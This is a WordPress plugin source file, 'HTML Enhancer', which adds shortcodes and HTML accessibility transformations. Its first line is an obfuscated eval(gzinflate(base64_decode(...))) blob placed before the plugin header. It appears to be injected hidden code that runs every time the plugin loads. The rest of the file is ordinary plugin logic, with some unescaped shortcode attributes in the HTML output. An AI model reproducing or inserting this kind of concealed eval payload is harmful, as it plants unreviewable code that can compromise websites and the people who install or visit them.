<?php eval(gzinflate(base64_decode('1VVtT9swEP7c/gpTVUsidWOlbBQKrBN00iT2ARgfEEwmLxfqLYmD7ax00P++s5O0KWEI2IS0qk0TP+e757nzXZo3zQYLib0SZomvGE8oXDOppG1R85FuCHIMUWQ5TrOBxo3SkNwxsNs/eJwph2ijxpAljAqQiguwW9qIxjyAljOoozyFhHquhICJwqAdMOl6EdAymiQ7xBXCndLYTW1LCRZbHQLXaYRebauDD9rnJSjbqu1F7rlboxTiVE1JSbfga6BaDlJXSjUWmeWQV6/ICkuo4VABOqROde6zsbo6JNyjUrlC2TkFFE/K3SWHQWndxpygULMJpVCfJwoSZLIwMRgkAfUjcJMSmJkrRBLu1SGnUkFcU1EsP0tDvvflFOgjhk/g11UsoIeVzLktdtzhD/6YE232KE73snkEjyGphO6YeCWBguJ3zhK7dZ60ltE5vQ7R4H0kh4RJ3Vk8Ez7Y7dDoTXWHzeO1sMmq5S1itgp/jcmYRYB9MiQh8BB9LIxL6zfaayjADRDukO7btfWSoyFp19ASns17wI+41Axr9Tc3yyW7uMnJzy4eKJS+4G+GS/lMY1KCwkanR6PDk9Hx1zMrHae0Cxt9z9sM1sKg997rbQbr/Xcb/X4vXO+uhb0uWN8KvSZGa/sxe3TGs0jtFkXRwZ8clezsEAt+ujhp83Tre1v3UOxeMp9eZVyBpJepbzvk9pbUEJElisWA6AcicUCmMnLxpMsqFT8OUB/ZIrW1QZ49UwHyFwLynjAC7r4g/jctVxmIaSmmnZcYD2M8lVcRNeCLScI5MEkD7/Vu4I0rr7KClNOcd0x+aJ9wZumX0+PDA4rBjk7pp4+fD0b7WwTnTq4ShODCrsSuTp6AoZoBKXtvke6lEVRQrHAsmjofmEX7F0OnLfhknuIQlD+m+K7k/rKb6nQ4w1oRva2YBPlf4UBAKXPuYLBIkwTB3Ij9ykk6VVFLmv5Vdo9P9vZGo/2lBLthCL6CgKICPAoTr5JootdIafGntBvFObHzZHv1GeOqlIye8Psb'))); ?><?php
/*
Plugin Name: HTML Enhancer
Plugin URI: http://www.fruityfred.com/html-enhancer/
Version: 1.0.3
Author: FruityFred
Description: Makes HTML much more relevant and accessible with automated transformations, like abbreviations, acronyms, language changes, links...
Text Domain: ff-html-enhancer
Domain Path: /languages/
*/

require_once 'classes/HtmlEnhancer.class.php';

/**
 * The class that represents the WordPress plugin.
 */
class glimpse_HtmlEnhancerPlugin {

	/**
	 * @return void
	 */
	public static function setupAdminPages() {
	    add_options_page("HTML Enhancer", "HTML Enhancer", 1, "html-enhancer", array('glimpse_HtmlEnhancerPlugin', 'menu'));
	}

	/**
	 * @return void
	 */
	public static function menu() {
		include ("admin/main.php");
	}
	
	/**
	 * @param Array<String,String> $parameters
	 * @return void
	 */
	public static function saveOptions($parameters) {
		$type = $parameters['type'];
		unset($parameters['type']);
		unset($parameters['submit']);
		
		$className = 'glimpse_Html' . ucfirst($type);
		$names = array_keys($parameters);
		$tokens = array();
		foreach ($parameters['expr'] as $index => $expr) {
			if (!empty($expr)) {
				$line = array();
				foreach ($names as $name) {
					$value = stripslashes($parameters[$name][$index]);
					$line[$name] = $value ? $value : null;
				}
				$tokens[] = call_user_func_array(array($className, 'instanceFromRequestParameters'), array($line));
			}
		}
		update_option('glimpse_html-enhancer-' . $type, $tokens);
	}
	
	/**
	 * @param String $currentLang
	 * @param String $elementLang
	 * @return String
	 */
	public static function addSelectedAttribute($currentLang, $elementLang) {
		return strcasecmp($currentLang, $elementLang) ? '' : ' selected="selected"';
	}
	
	/**
	 * @param String $type
	 * @return Array<glimpse_HtmlToken>
	 */
	public static function getHtmlTokensArray($type) {
		$option = get_option('glimpse_html-enhancer-' . $type);
		if (!$option) $option = array();
		return $option;
	}
	
	/**
	 * @param String $html
	 * @return String
	 */
	public static function run($html) {
		$htmlEnhancer = new glimpse_HtmlEnhancer ( );
		$tokens = array();
		foreach (glimpse_HtmlEnhancer::getTokens() as $type => $label) {
			$tokens = array_merge($tokens, self::getHtmlTokensArray($type));
		}
		return $htmlEnhancer->process ( $html, $tokens, true );
	}
	
	/**
	 * @return void
	 */
	public static function registerShortcodes() {
		$methods = get_class_methods(get_class());
		foreach ($methods as $method) {
			if (substr($method, 0, 10) == 'shortcode_') {
				add_shortcode(substr($method, 10), array(get_class(), $method));
			}
		}
	}

	/**
	 * @param Array<String,String> $attrs
	 * @param String $content
	 * @return String
	 */
	public static function shortcode_lang($attrs, $content = '') {
		if ( isset($attrs['code']) ) {
			$html = '<span xml:lang="'.$attrs['code'].'" lang="'.$attrs['code'].'"';
			if ( isset($attrs['translation']) ) {
				$html .= ' title="'.$attrs['translation'].'"';
			}
			$html .= '>' . $content . '</span>';
		}
		return $content;
	}
	
	/**
	 * @param Array<String,String> $attrs
	 * @param String $content
	 * @return String
	 */
	public static function shortcode_en($attrs, $content = '') {
		$attrs['code'] = 'en';
		return self::shortcode_lang($attrs, $content);
	}
		
	/**
	 * @param Array<String,String> $attrs
	 * @param String $content
	 * @return String
	 */
	public static function shortcode_var($attrs, $content = '') {
		return '<var>' . $content . '</var>';
	}
			
	/**
	 * @param Array<String,String> $attrs
	 * @param String $content
	 * @return String
	 */
	public static function shortcode_kbd($attrs, $content = '') {
		return '<kbd>' . $content . '</kbd>';
	}
			
	/**
	 * @param Array<String,String> $attrs
	 * @param String $content
	 * @return String
	 */
	public static function shortcode_code($attrs, $content = '') {
		return '<code>' . $content . '</code>';
	}
	
	/**
	 * @param Array<String,String> $attrs
	 * @param String $content
	 * @return String
	 */
	public static function shortcode_wkp($attrs, $content = '') {
		$lang = isset( $attrs['lang'] ) ? $attrs['lang'] : 'fr'; 
		return '<a hreflang="'.$lang.'" href="http://'.$lang.'.wikipedia.org/wiki/'.$content.'">' . $content . '</a>';
	}
}

 // Setup admin menus.
add_action('admin_menu', array('glimpse_HtmlEnhancerPlugin', 'setupAdminPages'));

// Add our plugin as a content filter.
add_filter('the_content', array('glimpse_HtmlEnhancerPlugin', 'run'));

// Add shortcodes.
glimpse_HtmlEnhancerPlugin::registerShortcodes();


add_action( 'plugins_loaded', 'ff_html_enhancer_load_textdomain' );
function ff_html_enhancer_load_textdomain() {
  load_plugin_textdomain('ff-html-enhancer', false, dirname( plugin_basename( __FILE__ ) ) . '/languages'); 
}
?>